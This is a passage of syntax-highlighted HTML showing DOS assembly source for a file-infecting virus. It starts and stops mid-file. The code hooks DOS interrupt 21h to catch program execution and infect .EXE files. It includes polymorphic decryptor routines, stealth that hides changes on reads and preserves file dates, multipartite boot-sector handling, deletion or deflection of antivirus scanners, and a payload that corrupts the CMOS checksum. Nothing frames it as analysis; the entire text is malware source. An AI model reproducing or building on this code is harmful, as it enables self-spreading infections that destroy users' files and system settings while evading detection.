</span><span class="sc5">EIGHT_BYTES</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">008h</span><span class="sc0">

</span><span class="sc5">USING_HARD_DISK</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc0">

</span><span class="sc5">KEEP_CF_INTACT</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc0">

</span><span class="sc5">CMOS_CRC_ERROR</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">02eh</span><span class="sc0">

</span><span class="sc5">CMOS_PORT</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">070h</span><span class="sc0">

</span><span class="sc5">REMOVE_NOP</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc0">

</span><span class="sc5">CR</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00dh</span><span class="sc0">

</span><span class="sc5">LF</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00ah</span><span class="sc0">

</span><span class="sc5">INT3_INCBX</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">043cch</span><span class="sc0">

</span><span class="sc5">INC_BL</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0c3feh</span><span class="sc0">

</span><span class="sc5">INCBX_INCBL_XOR</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">INT3_INCBX</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc5">INC_BL</span><span class="sc0">

</span><span class="sc5">JMP_NO_SIGN</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">079h</span><span class="sc0">

</span><span class="sc5">JMP_NOT_ZERO</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">075h</span><span class="sc0">

</span><span class="sc5">JNS_JNZ_XOR</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">JMP_NO_SIGN</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc5">JMP_NOT_ZERO</span><span class="sc0">

</span><span class="sc5">CLI_PUSHCS</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00efah</span><span class="sc0">



</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">



</span><span class="sc5">video_seg</span><span class="sc0">   </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc2">0c000h</span><span class="sc0">

        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">00000h</span><span class="sc0">

</span><span class="sc5">original_int_10</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">word</span><span class="sc0">

</span><span class="sc5">video_seg</span><span class="sc0">   </span><span class="sc9">ends</span><span class="sc0">



</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">



</span><span class="sc5">io_seg</span><span class="sc0">      </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc2">00070h</span><span class="sc0">

        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">00893h</span><span class="sc0">

</span><span class="sc5">original_2f_jmp</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">word</span><span class="sc0">

</span><span class="sc5">io_seg</span><span class="sc0">      </span><span class="sc9">ends</span><span class="sc0">



</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">



        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc5">COM_OFFSET</span><span class="sc0">

</span><span class="sc5">com_code</span><span class="sc4">:</span><span class="sc0">



</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">



        </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">POLYMORPHIC</span><span class="sc0">

</span><span class="sc5">first_decode</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">

</span><span class="sc5">serial_number</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">FIRST_UNDO_OFF</span><span class="sc4">],</span><span class="sc5">MIN_FILE_SIZE</span><span class="sc0">

        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">REMOVE_NOP</span><span class="sc0">

        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">FIVE_BYTES</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">load_it</span><span class="sc0">

        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc5">TWO_BYTES</span><span class="sc0">

</span><span class="sc5">rotated_code</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">SINGLE_BYTE_INT</span><span class="sc0">

        </span><span class="sc6">into</span><span class="sc0">

        </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0d4h</span><span class="sc0">

</span><span class="sc5">incbl_incbx</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">

</span><span class="sc5">first_jmp</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">serial_number</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">

        </span><span class="sc6">jns</span><span class="sc0"> </span><span class="sc5">serial_number</span><span class="sc0">

</span><span class="sc5">first_decode</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">



</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">



        </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">DOUBLE_DECRIPT</span><span class="sc0">

</span><span class="sc5">second_decode</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">

</span><span class="sc5">get_next_byte</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">lodsw</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">SECOND_UNDO_OFF</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0">

        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">REMOVE_NOP</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

</span><span class="sc5">second_jmp</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">jns</span><span class="sc0"> </span><span class="sc5">get_next_byte</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

</span><span class="sc5">second_decode</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

        </span><span class="sc9">ENDIF</span><span class="sc0">

        </span><span class="sc9">ENDIF</span><span class="sc0">



</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">



</span><span class="sc5">com_start</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">

        </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">MULTIPARTITE</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">full_move_w_si</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">NEW_INT_13_LOOP</span><span class="sc4">*</span><span class="sc5">ADDR_MUL</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">dont_set_int</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">VIRGIN_INT_13_B</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_both_ints</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc9">ENDIF</span><span class="sc0">

</span><span class="sc5">dont_set_int</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">CHECK_FOR_8088</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc5">RESIDENT_LENGTH</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc9">high</span><span class="sc4">(</span><span class="sc5">RESIZE_MEMORY</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">

        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">DOS_INT</span><span class="sc0">

        </span><span class="sc9">ELSEIF</span><span class="sc0">  </span><span class="sc5">MULTIPARTITE</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">RESIDENT_LENGTH</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc9">high</span><span class="sc4">(</span><span class="sc5">RESIZE_MEMORY</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">DOS_INT</span><span class="sc0">

        </span><span class="sc9">ENDIF</span><span class="sc0">

        </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">EXECUTE_SPAWNED</span><span class="sc0">

        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">from_com_code</span><span class="sc4">+</span><span class="sc5">RELATIVE_OFFSET</span><span class="sc0">

        </span><span class="sc6">popa</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc6">cmpsw</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">EXEC_SUBTRACT</span><span class="sc0">

        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">REMOVE_NOP</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">PARAMETER_TABLE</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">EXEC_PROGRAM</span><span class="sc0">

</span><span class="sc5">set_table</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">scasw</span><span class="sc0">

        </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">scasb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">

        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">set_table</span><span class="sc0">

        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">DOS_INT</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc9">high</span><span class="sc4">(</span><span class="sc5">GET_ERROR_LEVEL</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">DOS_INT</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc9">high</span><span class="sc4">(</span><span class="sc5">TERMINATE_W_ERR</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc9">ELSEIF</span><span class="sc0">  </span><span class="sc5">MULTIPARTITE</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">from_com_code</span><span class="sc4">+</span><span class="sc5">RELATIVE_OFFSET</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">TERMINATE_W_ERR</span><span class="sc0">

        </span><span class="sc9">ENDIF</span><span class="sc0">

        </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">MULTIPARTITE</span><span class="sc0">

        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">DOS_INT</span><span class="sc0">

        </span><span class="sc9">ELSE</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">boot_load</span><span class="sc0">

        </span><span class="sc9">ENDIF</span><span class="sc0">

</span><span class="sc5">com_start</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">



</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">



</span><span class="sc5">interrupt_21</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">far</span><span class="sc0">

        </span><span class="sc6">pushf</span><span class="sc0">

        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc6">cld</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">MAX_PATH_LENGTH</span><span class="sc0">

        </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">MULTIPARTITE</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">file_name</span><span class="sc4">+</span><span class="sc5">RELATIVE_OFFSET</span><span class="sc0">

        </span><span class="sc9">ENDIF</span><span class="sc0">

        </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">READING_STEALTH</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">DEFLECT_DELETE</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc9">ENDIF</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">EXEC_PROGRAM</span><span class="sc0">

        </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">READING_STEALTH</span><span class="sc0">

        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">start_process</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc9">high</span><span class="sc4">(</span><span class="sc5">OPEN_W_HANDLE</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc9">ENDIF</span><span class="sc0">

        </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">DEFLECT_DELETE</span><span class="sc0">

        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">start_process</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc9">high</span><span class="sc4">(</span><span class="sc5">UNLINK</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc9">ENDIF</span><span class="sc0">

        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">a_return</span><span class="sc0">

</span><span class="sc5">start_process</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">copy_name</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">MULTIPARTITE</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

        </span><span class="sc9">ENDIF</span><span class="sc0">

        </span><span class="sc6">scasb</span><span class="sc0">

        </span><span class="sc6">loopne</span><span class="sc0">  </span><span class="sc5">copy_name</span><span class="sc0">

        </span><span class="sc6">std</span><span class="sc0">

        </span><span class="sc6">scasw</span><span class="sc0">

        </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">MULTIPARTITE</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc5">FIVE_BYTES</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc9">ENDIF</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'E'</span><span class="sc0">

        </span><span class="sc6">scasw</span><span class="sc0">

        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">a_return</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc12">'X'</span><span class="sc0">

        </span><span class="sc6">scasw</span><span class="sc0">

        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">a_return</span><span class="sc0">

        </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">MULTIPARTITE</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">

        </span><span class="sc9">ENDIF</span><span class="sc0">

        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">open_close_file</span><span class="sc0">

        </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">SAME_FILE_DATE</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">new_time</span><span class="sc4">+</span><span class="sc5">ONE_BYTE</span><span class="sc4">+</span><span class="sc5">RELATIVE_OFFSET</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">new_date</span><span class="sc4">+</span><span class="sc5">ONE_BYTE</span><span class="sc4">+</span><span class="sc5">RELATIVE_OFFSET</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">

        </span><span class="sc9">ENDIF</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">

        </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">MULTIPARTITE</span><span class="sc0">

        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">large_exe_file</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc5">FILE_SIGNATURE</span><span class="sc0">

        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">our_kind</span><span class="sc0">

        </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">INFECT_RANDOM</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">

        </span><span class="sc6">jpo</span><span class="sc0"> </span><span class="sc5">our_kind</span><span class="sc0">

        </span><span class="sc9">ENDIF</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">NEW_EXE_OFFSET</span><span class="sc4">],</span><span class="sc5">NEW_EXE_HEADER</span><span class="sc0">

        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">test_if_open</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">PKLITE_OFFSET</span><span class="sc4">],</span><span class="sc5">PKLITE_SIGN</span><span class="sc0">

        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">test_if_open</span><span class="sc0">

        </span><span class="sc9">ELSE</span><span class="sc0">

        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">our_kind</span><span class="sc0">

        </span><span class="sc9">ENDIF</span><span class="sc0">

</span><span class="sc5">large_exe_file</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">popa</span><span class="sc0">

        </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">MULTIPARTITE</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

        </span><span class="sc9">ENDIF</span><span class="sc0">

        </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">ANTI_ANTIVIRUS</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'N'</span><span class="sc0">

        </span><span class="sc6">scasb</span><span class="sc0">

        </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">a_return</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'A'</span><span class="sc0">

        </span><span class="sc6">scasb</span><span class="sc0">

        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">a_return</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

        </span><span class="sc6">popa</span><span class="sc0">

        </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">READING_STEALTH</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">DEFLECT_DELETE</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc9">high</span><span class="sc4">(</span><span class="sc5">EXEC_PROGRAM</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">opened_file</span><span class="sc0">

        </span><span class="sc9">ENDIF</span><span class="sc0">

        </span><span class="sc6">popf</span><span class="sc0">

        </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">CMOS_BOMB</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">CMOS_CRC_ERROR</span><span class="sc0">

        </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc5">CMOS_PORT</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc9">ENDIF</span><span class="sc0">

        </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">DELETE_SCANNERS</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc9">high</span><span class="sc4">(</span><span class="sc5">UNLINK</span><span class="sc4">)</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">old_int_10_21</span><span class="sc0">

        </span><span class="sc9">ELSE</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">ERROR_IN_EXE</span><span class="sc0">

        </span><span class="sc6">stc</span><span class="sc0">

        </span><span class="sc6">retf</span><span class="sc0">    </span><span class="sc5">KEEP_CF_INTACT</span><span class="sc0">

        </span><span class="sc9">ENDIF</span><span class="sc0">

        </span><span class="sc9">ELSE</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">a_return</span><span class="sc0">

        </span><span class="sc9">ENDIF</span><span class="sc0">

</span><span class="sc5">our_kind</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">popa</span><span class="sc0">

        </span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">MULTIPARTITE</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

</span><span class="sc5">error_in_copy</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">ch</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">OPEN_W_HANDLE</span><span class="sc4">+</span><span class="sc5">DENYNONE</span><span class="sc0">

        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc5">INT_21_IS_NOW</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">close_it</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">ch</span><span class="sc0">

